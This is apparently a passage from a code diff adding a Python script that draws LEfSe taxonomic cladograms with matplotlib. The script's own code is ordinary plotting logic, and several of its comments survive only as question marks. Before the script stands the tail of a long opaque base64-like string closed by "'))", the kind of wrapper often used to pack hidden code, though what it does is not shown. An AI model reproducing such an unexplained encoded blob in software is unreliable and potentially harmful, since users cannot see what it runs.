/Bdith5KUT14N559DU2TEg4EsDoMTlRLGXTGoe810e8ADd+d9pXMqzZTbra9jYks8rOKNobrZdZ1myP1naHgcA4b04UZKVlojCXXF+VZaIzes8Bivx5kxzgdNT2khbKgN76ykGy4DhrXDlaflXcuvptvR7WZtqBVdV2NGlRFDojZ594qEAlOTSdEO6uwpE1A4zYQbm982q2jyRc0JR8XAm480cwkNNfPmyyEwzVhca0053hHHtr1XO5kf2MM4+xkBopaXmscn8JfzAIzzXbq6M0RlK44OmHC+yIq+2KDQVS1YrDCh4omQRCBH6eiTVhxaPsDKgs+yfuCSI3/x4iifXAyHAigK2ywEiSD63bdnb36QZT2SZPaLQOFnUy3brxblMFesDHZm+tY0lDeGrURBogElpdAvdfAJjKXK+y1Pa8nJJUqjZyMrKgGSDCF+hZ5ievJq/5Shm3mh+bD2uH543g+RY6IlAVmPTmTbRct3sbvWYf+VetryJBZSnk7h/eNzpPpS4lQrFJhmtbZGoyXPo8HezbX6A6inUlz7WEYsxJLgpPWWMQaIIAJJ6wreZZarvD7QHzHTNgyc/4zyJKT8004eYxGTUV54noPZXvnbGgWN4eCoYLCjsIsvCkCpDebllF+mTAQUppI7i29Q6zPJK6hdGwrW56HJfwe90QxAyCqXB62dYbgLlzlUpeM//78+n8//9N///T+UmPdKfdvce/SkhTd1cp+6zMzCJ/aGZGI61QMDM0qn+TR2i1wSWsmVwJe'))
+#!/usr/bin/env python3
+# 3. ?????????
+import os, sys, matplotlib, argparse, string
+
+# from io import StringIO
+matplotlib.use("Agg")
+from pylab import *
+from lefse import *
+import numpy as np
+import matplotlib.pyplot as plt
+import re
+
+# colors = [
+#     "#19456e",  # Red
+#     "#8f3339",  # Blue
+#     # "#ea801c",  # D Orange
+#     # "#800074",  # D Med Purple
+#     "#800074",  # B Med Purple
+#     "#298c8c",  # B ????????? (teal-like color
+#     "#1a80bb",  # A Blue,
+#     "#ea801c",  # A Orange
+#     "#298c8c",  # ????????? (teal-like color)
+#     "#f1a226",  # ????????? (orange-yellow color)
+#     "#f45f74",  # Med Pink
+#     "#8fd7d7",  # Light Blue
+#     "#98c127",  # Med Green
+#     "#ff8ca1",  # Light Pink
+#     "#ffcd8e",  # Light Orange
+#     "#36b700",  # Green
+# ]
+
+
+class CladeNode:
+    def __init__(self, name, abundance, viz=True):
+        self.id = name
+        self.name = name.split(".")
+        self.last_name = self.name[-1]
+        self.abundance = abundance
+        self.pos = (-1.0, -1.0)
+        self.children = {}
+        self.isleaf = True
+        self.color = "lightgray"
+        self.next_leaf = -1
+        self.prev_leaf = -1
+        self.viz = viz
+
+    def __repr__(self):
+        return self.last_name
+
+    def add_child(self, node):
+        self.isleaf = False
+        self.children[node.__repr__()] = node
+
+    def get_children(self):
+        ck = sorted(self.children.keys())
+        return [self.children[k] for k in ck]
+
+    def get_color(self):
+        return self.color
+
+    def set_color(self, c):
+        self.color = c
+
+    def set_pos(self, pos):
+        self.pos = pos
+
+
+def read_params(args):
+    parser = argparse.ArgumentParser(description="Cladoplot")
+    parser.add_argument(
+        "input_file", metavar="INPUT_FILE", type=str, help="tab delimited input file"
+    )
+    parser.add_argument(
+        "output_file",
+        metavar="OUTPUT_FILE",
+        type=str,
+        help="the file for the output image",
+    )
+    parser.add_argument("--clade_sep", dest="clade_sep", type=float, default=1.5)
+    parser.add_argument("--max_lev", dest="max_lev", type=int, default=-1)
+    parser.add_argument(
+        "--max_point_size", dest="max_point_size", type=float, default=6.0
+    )
+    parser.add_argument(
+        "--min_point_size", dest="min_point_size", type=float, default=1
+    )
+    parser.add_argument(
+        "--point_edge_width", dest="markeredgewidth", type=float, default=0.25
+    )
+    parser.add_argument(
+        "--colors", dest="colors", type=str, nargs="+", help="GROUP COLORS"
+    )
+    parser.add_argument(
+        "--siblings_connector_width",
+        dest="siblings_connector_width",
+        type=float,
+        default=2,
+    )
+    parser.add_argument(
+        "--parents_connector_width",
+        dest="parents_connector_width",
+        type=float,
+        default=0.75,
+    )
+    parser.add_argument(
+        "--radial_start_lev", dest="radial_start_lev", type=int, default=1
+    )
+    parser.add_argument(
+        "--labeled_start_lev", dest="labeled_start_lev", type=int, default=2
+    )
+    parser.add_argument(
+        "--labeled_stop_lev", dest="labeled_stop_lev", type=int, default=7
+    )
+    parser.add_argument("--abrv_start_lev", dest="abrv_start_lev", type=int, default=3)
+    parser.add_argument("--abrv_stop_lev", dest="abrv_stop_lev", type=int, default=7)
+    parser.add_argument(
+        "--expand_void_lev", dest="expand_void_lev", type=int, default=1
+    )
+    parser.add_argument(
+        "--class_legend_vis", dest="class_legend_vis", type=int, default=1
+    )
+    parser.add_argument(
+        "--colored_connector", dest="colored_connectors", type=int, default=1
+    )
+    parser.add_argument("--alpha", dest="alpha", type=float, default=0.2)
+    parser.add_argument("--title", dest="title", type=str, default="LEfSe Cladogram")
+    parser.add_argument("--sub_clade", dest="sub_clade", type=str, default="")
+    parser.add_argument(
+        "--title_font_size", dest="title_font_size", type=str, default="12"
+    )
+    parser.add_argument("--right_space_prop", dest="r_prop", type=float, default=0.1)
+    parser.add_argument("--left_space_prop", dest="l_prop", type=float, default=0.1)
+    parser.add_argument(
+        "--label_font_size", dest="label_font_size", type=str, default="6"
+    )
+    parser.add_argument(
+        "--background_color",
+        dest="back_color",
+        type=str,
+        choices=["k", "w"],
+        default="w",
+        help="set the color of the background",
+    )
+    parser.add_argument(
+        "--colored_labels",
+        dest="col_lab",
+        type=int,
+        choices=[0, 1],
+        default=1,
+        help="draw the label with class color (1) or in black (0)",
+    )
+    parser.add_argument(
+        "--class_legend_font_size",
+        dest="class_legend_font_size",
+        type=str,
+        default="8",
+    )
+    parser.add_argument("--dpi", dest="dpi", type=int, default=72)
+    parser.add_argument(
+        "--format",
+        dest="format",
+        choices=["png", "svg", "pdf"],
+        default="svg",
+        type=str,
+        help="the format for the output file",
+    )
+    parser.add_argument("--all_feats", dest="all_feats", type=str, default="")
+    parser.add_argument(
+        "--footnote", dest="footnote", type=str, default="",
+        help="small caption drawn at the bottom of the figure",
+    )
+    parser.add_argument(
+        "--footnote_font_size", dest="footnote_font_size", type=str, default="6",
+    )
+    parser.add_argument(
+        "--db_label", dest="db_label", type=str, default="",
+        help="small kicker line drawn above the title (e.g. reference database name)",
+    )
+    parser.add_argument(
+        "--class_labels", dest="class_labels", type=str, nargs="*", default=[],
+        help="raw_class=display_text pairs; lets class values carry a sort-order-encoding "
+             "prefix internally while showing clean text",
+    )
+    args = parser.parse_args()
+    args.class_labels = dict(p.split("=", 1) for p in args.class_labels)
+    return vars(args)
+
+
+def cmp_names(la, lb):
+    if len(la) != len(lb):
+        return False
+    for p in [(a, b) for i, a in enumerate(la) for j, b in enumerate(lb) if i == j]:
+        if p[0] != p[1]:
+            return False
+    return True
+
+
+def build_tree(father, all_nodes, l, depth, viz):
+    cc = [
+        n
+        for n in all_nodes
+        if len(n.name) > len(father.name)
+        and cmp_names(father.name, n.name[: len(father.name)])
+    ]
+    children = [n for n in cc if len(n.name) == len(father.name) + 1]
+    if len(children) == 0 and l < depth - 1:  # !!!
+        nc = CladeNode(father.id + "." + father.id.split(".")[-1], 1.0, viz)
+        father.add_child(nc)
+        children.append(nc)
+    for child in children:
+        build_tree(child, cc, l + 1, depth, viz)
+        father.add_child(child)
+
+
+def get_all_nodes(father):
+    ret = [father]
+    children = father.get_children()
+    for c in children:
+        ret += get_all_nodes(c)
+    return ret
+
+
+def read_data(colors, input_file, params):
+    with open(input_file, "r") as inp:
+        if params["sub_clade"] == "":
+            rows = [
+                line.strip().split()[:-1]
+                for line in inp.readlines()
+                if params["max_lev"] < 1
+                or line.split()[0].count(".") < params["max_lev"]
+            ]
+        else:
+            rows = [
+                line.split(params["sub_clade"] + ".")[1].strip().split()[:-1]
+                for line in inp.readlines()
+                if (
+                    params["max_lev"] < 1
+                    or line.split()[0].count(".") < params["max_lev"]
+                )
+                and line.startswith(params["sub_clade"] + ".")
+            ]
+    all_names = [lin[0] for lin in rows]
+    to_add = []
+
+    abundances = [float(v) for v in list(zip(*rows))[1] if float(v) >= 0.0]
+    tree = {}
+    tree["classes"] = list(set([v[2] for v in rows if len(v) > 2]))
+    tree["classes"].sort()
+    all_nodes = [CladeNode("root." + row[0], float(row[1])) for row in rows]
+
+    depth = max([len(n.name) for n in all_nodes])
+
+    n2 = ["_".join(nn.name) for nn in all_nodes]
+    for i, nn in enumerate(all_nodes):
+        n = nn
+        while "_".join(n.name[:-1]) not in n2 and len(n.name) > 1:
+            n = CladeNode(".".join(n.name[:-1]), n.abundance)
+            all_nodes.append(n)
+            n2.append("_".join(n.name))
+
+    cls2 = []
+    if params["all_feats"] != "":
+        cls2 = sorted(params["all_feats"].split(":"))
+    for i, v in enumerate(rows):
+        if len(v) > 2:
+            if len(cls2) > 0:
+                all_nodes[i].set_color(colors[cls2.index(v[2]) % len(colors)])
+            else:
+                if v[2].count("rgbcol") > 0:
+                    ccc = [float(tt) for tt in v[2].split("_")[1:]]
+                    all_nodes[i].set_color(ccc)
+                else:
+                    all_nodes[i].set_color(
+                        colors[sorted(tree["classes"]).index(v[2]) % len(colors)]
+                    )
+    root = CladeNode("root", -1.0)
+    root.set_pos((0.0, 0.0))
+
+    build_tree(root, all_nodes, 0, depth, params["expand_void_lev"] == 1)
+
+    all_nodes = get_all_nodes(root)
+
+    tree["root"] = root
+    tree["max_abs"] = max(abundances)
+    tree["min_abs"] = min(abundances)
+    levs = []
+    for i in range(depth):
+        depthi = [n for n in all_nodes if len(n.name) == i + 1]
+        levs.append(len(depthi))
+    tree["nlev"] = levs
+    return tree
+
+
+def add_all_pos(father, n, distn, seps, tsep, mlev, last_leaf=-1, nc=1):
+    children = father.get_children()
+    leaves = True if children[0].isleaf else False
+    for i, child in enumerate(children):
+        if leaves:
+            n += 1.0
+            men = 0.5 if len(children) == 1 else 0.0
+            child.set_pos(
+                (
+                    n * distn - men * float(distn) + tsep,
+                    (len(father.name)) / float(mlev - 1),
+                )
+            )
+            if last_leaf != -1:
+                child.prev_leaf = last_leaf
+                last_leaf.next_leaf = child
+            last_leaf = child
+        else:
+            ln = n
+            ltsep = tsep
+            n, tsep, last_leaf = add_all_pos(
+                child, n, distn, seps, tsep, mlev, last_leaf, len(children)
+            )
+            nn = (ln + n) * 0.5 * distn
+            ssep = (ltsep + tsep) * 0.5
+            if n - ln == 1:
+                ssep = ltsep
+            child.set_pos((nn + ssep, (len(father.name)) / float(mlev - 1)))
+    tsep += seps[len(father.name) - 1]
+    return n, tsep, last_leaf
+
+
+def plot_points(father, params, pt_scale, ax):
+    children = father.get_children()
+    children.sort(key=lambda a: -int(a.get_color() == "lightgray") * a.abundance)
+    x, r = father.pos[0], father.pos[1]
+    for i, child in enumerate(children):
+        xc, rc = plot_points(child, params, pt_scale, ax)
+    if not father.viz:
+        return x, r
+    ps = pt_scale[0] + father.abundance / pt_scale[1] + pt_scale[0]
+    col = father.get_color()
+    pw = (
+        params["markeredgewidth"]
+        if col == "lightgray"
+        else params["markeredgewidth"] * 3.0
+    )
+    if x == 0 and r == 0:
+        ax.plot(
+            x,
+            r,
+            "o",
+            markersize=ps,
+            color=col,
+            markeredgewidth=0.01,
+            markeredgecolor=params["fore_color"],
+        )
+    else:
+        ax.plot(
+            x,
+            r,
+            "o",
+            markersize=ps,
+            color=col,
+            markeredgewidth=pw,
+            markeredgecolor=params["fore_color"],
+        )
+
+    return x, r
+
+
+def plot_lines(father, params, depth, ax, xf):
+    children = father.get_children()
+    x, r = father.pos[0], father.pos[1]
+    for i, child in enumerate(children):
+        xc, rc = plot_lines(child, params, depth, ax, x)
+        if i == 0:
+            x_first, r_first = xc, rc
+        if len(father.name) >= depth - params["radial_start_lev"]:
+            col = params["fore_color"]
+            lw = params["parents_connector_width"]
+            if not child.viz:
+                continue
+            if (
+                father.get_color() != "lightgray"
+                and father.get_color() == child.get_color()
+                and params["colored_connectors"]
+            ):
+                col = child.get_color()
+                lw *= 2.5
+            if col != params["fore_color"]:
+                ax.plot([x, xc], [r, rc], "-", color=params["fore_color"], lw=lw * 1.5)
+            ax.plot([x, xc], [r, rc], "-", color=col, lw=lw)
+
+    if not father.viz or (len(children) == 1 and not children[0].viz):
+        return x, r
+    if len(father.name) < depth - params["radial_start_lev"]:
+        col = params["fore_color"]
+        lw = params["parents_connector_width"]
+        if father.get_color() != "lightgray":
+            f = True
+            for child in children:
+                if (
+                    child.get_color() != father.get_color()
+                    or not params["colored_connectors"]
+                ):
+                    f = False
+                    break
+            if f:
+                col = father.get_color()
+                lw *= 2.5
+        if not (x == 0 and r == 0):
+            xx = xc if len(children) > 0 else x
+            if len(children) == 0:
+                rc = r
+            xt = x if len(children) > 1 else xx
+            if col != params["fore_color"]:
+                ax.plot([x, xt], [r, rc], "-", color=params["fore_color"], lw=lw * 1.5)
+            ax.plot([x, xt], [r, rc], "-", color=col, lw=lw)
+    if len(children) > 0 and 1 < len(father.name) < depth - params["radial_start_lev"]:
+        xs = arange(x_first, xc, 0.01)
+        ys = [rc for t in xs]
+        ax.plot(
+            xs,
+            ys,
+            "-",
+            color=col,
+            lw=params["siblings_connector_width"],
+            markeredgecolor=params["fore_color"],
+        )
+    return x, r
+
+
+def uniqueid():
+    for l in string.ascii_lowercase:
+        yield l
+    for l in string.ascii_lowercase:
+        for i in range(10):
+            yield l + str(i)
+    i = 0
+    while True:
+        yield str(i)
+        i += 1
+
+
+def plot_names(colors, father, params, depth, ax, u_i, seps):
+    children = father.get_children()
+    l = len(father.name)
+    if len(children) == 0:
+        if father.prev_leaf == -1 or father.next_leaf == -1:
+            fr_0, fr_1 = father.pos[0], father.pos[0]
+        else:
+            fr_0, fr_1 = (father.pos[0] + father.prev_leaf.pos[0]) * 0.5, (
+                father.pos[0] + father.next_leaf.pos[0]
+            ) * 0.5
+    for i, child in enumerate(children):
+        fr, to = plot_names(colors, child, params, depth, ax, u_i, seps)
+        if i == 0:
+            fr_0 = fr
+        fr_1 = to
+    if (
+        father.get_color()
+        != "lightgray"
+        # and params["labeled_start_lev"] < l <= params["labeled_stop_lev"] + 1
+    ):
+        col = father.get_color()
+        dd = params["labeled_stop_lev"] - params["labeled_start_lev"] + 1
+        de = depth - 1
+        dim = 1.0 / float(de)
+        perc_ext = 0.65 if dim > 0.1 else 1.0
+        clto = (de - l + 1) * dim + dim * (dd + 1 - (l - dd - 1)) * perc_ext
+        clto = (de - l + 1) * dim + dim * (
+            dd - (l - params["labeled_start_lev"]) + 1
+        ) * perc_ext
+        des = float(180.0 * (fr_0 + fr_1) / np.pi) * 0.5 - 90
+        lab = ""
+        txt = father.last_name
+        if params["abrv_start_lev"] < l <= params["abrv_stop_lev"] + 1:
+            ide = next(u_i)
+            tax_level = father.last_name.split("_", maxsplit=1)[0]
+            tax_name = father.last_name.split("_", maxsplit=1)[1].replace("_", " ")
+            lab = f"{str(ide)} : {tax_level}_{tax_name}"
+            txt = str(ide)
+        #        ax.bar(fr_0, clto, width = fr_1-fr_0, bottom = float(l-1)/float(depth-1), alpha = params['alpha'], color=col, edgecolor=col)
+        match = re.search(r"(g_|s_)(.*)", lab)
+        if match:
+            # ???????????????????????????????????????????????????????????????
+            prefix = match.group(1)  # "g_" ??? "s_"
+            italic_part = match.group(2)  # ???????????????
+            label_text = (
+                str(ide)
+                + " : "
+                + prefix
+                + r"$\mathit{"
+                + italic_part.replace("_", r"\_")
+                + "}$"
+            )
+        else:
+            # ???????????????????????????????????????
+            label_text = lab
+
+        ax.bar(
+            fr_0,
+            clto,
+            width=fr_1 - fr_0,
+            bottom=float(l - 1) / float(de),
+            alpha=params["alpha"],
+            color=col,
+            edgecolor=col,
+        )
+        ax.bar(
+            0.0,
+            0.0,
+            width=0.0,
+            bottom=0.0,
+            alpha=1.0,
+            color=col,
+            edgecolor=params["fore_color"],
+            # label=lab,
+            label=label_text,
+        )
+        if l <= params["abrv_stop_lev"] + 1:
+            if not params["col_lab"]:
+                col = params["fore_color"]
+            else:
+                if col not in colors:
+                    col = params["fore_color"]
+                else:
+                    col = colors[colors.index(col) % len(colors)]
+            ax.text(
+                (fr_0 + fr_1) * 0.5,
+                clto + float(l - 1) / float(de) - dim * perc_ext / 2.0,
+                txt,
+                size=params["label_font_size"],
+                rotation=des,
+                ha="center",
+                va="center",
+                color=col,
+            )
+    return fr_0, fr_1
+
+
+def draw_tree(colors, out_file, tree, params):
+    plt_size = 10
+    nlev = tree["nlev"]
+    pt_scale = (
+        params["min_point_size"],
+        max(
+            1.0,
+            ((tree["max_abs"] - tree["min_abs"]))
+            / (params["max_point_size"] - params["min_point_size"]),
+        ),
+    )
+    depth = len(nlev)
+    sep = (2.0 * np.pi) / float(nlev[-1])
+    seps = [
+        params["clade_sep"] * sep / float(depth - i + 1)
+        for i in range(1, len(tree["nlev"]) + 1)
+    ]
+    totseps = sum([s * nlev[i] for i, s in enumerate(seps[:-1])])
+    clade_sep_err = True if totseps > np.pi else False
+    while totseps > np.pi:
+        params["clade_sep"] *= 0.75
+        seps = [
+            params["clade_sep"] * sep / (float(depth - i + 1) * 0.25)
+            for i in range(1, len(tree["nlev"]) + 1)
+        ]
+        totseps = sum([s * nlev[i] for i, s in enumerate(seps[:-1])])
+    if clade_sep_err:
+        print("clade_sep parameter too large, lowered to", params["clade_sep"])
+
+    fig = plt.figure(edgecolor=params["back_color"], facecolor=params["back_color"])
+    ax = fig.add_subplot(
+        111, polar=True, frame_on=False, facecolor=params["back_color"]
+    )
+    plt.subplots_adjust(left=-0.03, right=0.9)
+    ax.grid(False)
+    xticks([])
+    yticks([])
+
+    ds = (2.0 * np.pi - totseps) / float(nlev[-1])
+
+    add_all_pos(tree["root"], 0.0, ds, seps, 0.0, depth)
+
+    plot_lines(tree["root"], params, depth, ax, 0)
+    plot_points(tree["root"], params, pt_scale, ax)
+    plot_names(colors, tree["root"], params, depth, ax, uniqueid(), seps)
+    r = np.arange(0, 3.0, 0.01)
+    theta = 2 * np.pi * r
+
+    def get_col_attr(x):
+        return hasattr(x, "set_color") and not hasattr(x, "set_facecolor")
+
+    h, l = ax.get_legend_handles_labels()
+    if len(l) > 0:
+        # Each column allows at most 35 species (rows)
+        ncol = len(l) // 35 + 1
+        leg = ax.legend(
+            bbox_to_anchor=(1.02, 1),
+            frameon=False,
+            loc=2,
+            borderaxespad=0.0,
+            prop={"size": params["label_font_size"]},
+            ncol=ncol,
+        )
+        if leg != None:
+            gca().add_artist(leg)
+            for o in leg.findobj(get_col_attr):
+                o.set_color(params["fore_color"])
+
+    cll = (
+        sorted(tree["classes"])
+        if params["all_feats"] == ""
+        else sorted(params["all_feats"].split(":"))
+    )
+    nll = [
+        ax.bar(0.0, 0.0, width=0.0, bottom=0.0, color=colors[i % len(colors)], label=c)
+        for i, c in enumerate(cll)
+        if c in tree["classes"]
+    ]
+    cl = [params["class_labels"].get(c, c) for c in cll if c in tree["classes"]]
+
+    ax.set_title(
+        params["title"], size=params["title_font_size"], color=params["fore_color"]
+    )
+    if params["db_label"]:
+        ax.annotate(
+            params["db_label"],
+            xy=(0.5, 1.0),
+            xycoords=("axes fraction", "axes fraction"),
+            xytext=(0, float(params["title_font_size"]) * 2.2),
+            textcoords="offset points",
+            ha="center",
+            va="bottom",
+            size=float(params["title_font_size"]) * 0.6,
+            color="gray",
+        )
+
+    if params["class_legend_vis"]:
+        l2 = legend(
+            nll,
+            cl,
+            loc=2,
+            prop={"size": params["class_legend_font_size"]},
+            frameon=False,
+        )
+        if l2 != None:
+            for o in l2.findobj(get_col_attr):
+                o.set_color(params["fore_color"])
+    # add bbox to deal with legnd overflow
+
+    # ???????????????????????????????????????????????????
+    fig = plt.gcf()  # ???????????? figure
+    w, h = fig.get_size_inches()  # ?????????????????????
+    fig.set_size_inches(w * 1.1, h * 0.95)  # ??????????????? 20%???????????????
+
+    if params["footnote"]:
+        fig.text(
+            0.5,
+            0.01,
+            params["footnote"],
+            ha="center",
+            va="bottom",
+            size=params["footnote_font_size"],
+            color=params["fore_color"],
+        )
+
+    plt.savefig(
+        out_file,
+        format=params["format"],
+        facecolor=params["back_color"],
+        edgecolor=params["fore_color"],
+        dpi=params["dpi"],
+        # bbox_inches="tight",
+    )
+    plt.close()
+
+
+def plot_cladogram():
+    params = read_params(sys.argv)
+    params["fore_color"] = "w" if params["back_color"] == "k" else "k"
+    clad_tree = read_data(params["colors"], params["input_file"], params)
+    draw_tree(params["colors"], params["output_file"], clad_tree, params)
+
+
+if __name__ == "__main__":
+
+    plot_cladogram()
